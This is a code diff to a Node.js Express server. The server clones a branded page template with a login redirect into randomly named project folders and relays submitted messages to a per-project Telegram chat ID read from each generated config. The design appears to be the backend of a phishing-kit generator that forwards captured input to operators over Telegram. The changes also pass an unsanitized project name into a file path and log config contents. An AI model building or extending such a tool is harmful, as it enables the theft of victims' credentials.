@@ -8,7 +8,7 @@ const fs = require('fs-extra');
 const axios = require('axios');
 
 const app = express();
-const port = process.env.PORT || 3000;
+const PORT = process.env.PORT || 8080;
 
 // --- Directory Setup ---
 const UPLOADS_DIR = path.join(__dirname, 'uploads');
@@ -71,6 +71,7 @@ app.post('/api/generate', upload.single('photo'), async (req, res) => {
     let indexContent = await fs.readFile(indexPath, 'utf8');
     
     indexContent = indexContent.replace(/IMAGES\/IMG_0546\.jpeg/g, photoPath);
+    indexContent = indexContent.replace(/window.location.href = 'USER\/login.html';/g, `window.location.href = 'USER/login.html?project=${randomFolderName}';`);
     indexContent = indexContent.replace(/<h1 class="text-\[28px\] font-semibold tracking-\[0.08em\] uppercase text-white leading-none">AMBASSADOR<\/h1>/g, `<h1 class="text-[28px] font-semibold tracking-[0.08em] uppercase text-white leading-none">${projectName}</h1>`);
     indexContent = indexContent.replace(/<span class="bg-white rounded-full px-5 py-\[7px\] text-\[13px\] font-medium text-gray-900 shadow-\[0_2px_12px_rgba\(0,0,0,0.10\)\] tracking-\[0.01em\]">\s*AMBASSADOR\s*<\/span>/g, `<span class="bg-white rounded-full px-5 py-[7px] text-[13px] font-medium text-gray-900 shadow-[0_2px_12px_rgba(0,0,0,0.10)] tracking-[0.01em]">${projectName}</span>`);
     
@@ -90,53 +91,64 @@ app.post('/api/generate', upload.single('photo'), async (req, res) => {
 // API endpoint for sending Telegram messages
 app.post('/api/send-telegram', async (req, res) => {
     const { message, projectName } = req.body;
-
-    if (!message) {
-        return res.status(400).json({ error: 'Message is required' });
-    }
+    console.log(`\n--- TELEGRAM SEND PROCESS ---`);
+    console.log(`[1/7] Received request. Project Name: '${projectName}'`);
 
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-    if (!TELEGRAM_BOT_TOKEN) {
-        return res.status(500).json({ error: 'Server configuration error' });
+    let chatId;
+
+    if (!projectName) {
+        console.log(`[FAIL] Project Name is empty. Aborting.`);
+        return res.status(400).json({ error: 'Project Name is missing' });
     }
 
-    let chatId;
+    const configPath = path.join(U_DIR, projectName, 'JS', 'config.js');
+    console.log(`[2/7] Constructed config path: ${configPath}`);
+
     try {
-        if (projectName) {
-            const configPath = path.join(U_DIR, projectName, 'JS', 'config.js');
-            if (fs.existsSync(configPath)) {
-                const configContent = await fs.readFile(configPath, 'utf8');
-                const match = configContent.match(/const TELEGRAM_CHAT_ID = "([^"]+)"/);
-                if (match) {
-                    chatId = match[1];
-                }
-            }
+        const configContent = await fs.readFile(configPath, 'utf8');
+        console.log(`[3/7] Successfully read config file content:\n---\n${configContent.trim()}\n---`);
+
+        const match = configContent.match(/TELEGRAM_CHAT_ID\s*=\s*["'](.+?)["']/);
+        console.log(`[4/7] Regex match result:`, match);
+
+        if (match && match[1]) {
+            chatId = match[1];
+            console.log(`[5/7] Extracted Chat ID: '${chatId}'`);
+        } else {
+            console.log(`[FAIL] Could not extract Chat ID from config file.`);
         }
     } catch (error) {
-        console.error('Could not read chat ID from generated project:', error);
+        console.log(`[FAIL] Error reading config file:`, error);
+        return res.status(500).json({ error: 'Could not read project configuration' });
     }
 
     if (!chatId) {
+        console.log(`[FAIL] Chat ID is missing after processing. Aborting.`);
         return res.status(400).json({ error: 'Chat ID not found for project' });
     }
 
     const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    console.log(`[6/7] Preparing to send message to Telegram API for Chat ID: '${chatId}'`);
 
     try {
         await axios.post(telegramApiUrl, {
             chat_id: chatId,
             text: message,
-            parse_mode: 'Markdown',
+            parse_mode: 'Markdown'
         });
+        console.log(`[7/7] Successfully sent message to Telegram.`);
         res.status(200).json({ success: true });
     } catch (error) {
-        console.error('Error sending to Telegram:', error.response ? error.response.data : error.message);
-        res.status(500).json({ error: 'Failed to send message' });
+        const errorMessage = error.response ? error.response.data : error.message;
+        console.log(`[FAIL] Error sending message to Telegram:`, errorMessage);
+        res.status(500).json({ error: 'Failed to send message to Telegram', details: errorMessage });
     }
+    console.log(`--- END TELEGRAM SEND PROCESS ---\n`);
 });
 
 
 // --- Server Start ---
-app.listen(port, () => {
-  console.log(`Server running at http://localhost:${port}`);
+app.listen(PORT, () => {
+  console.log(`Server running at http://localhost:${PORT}`);
 });
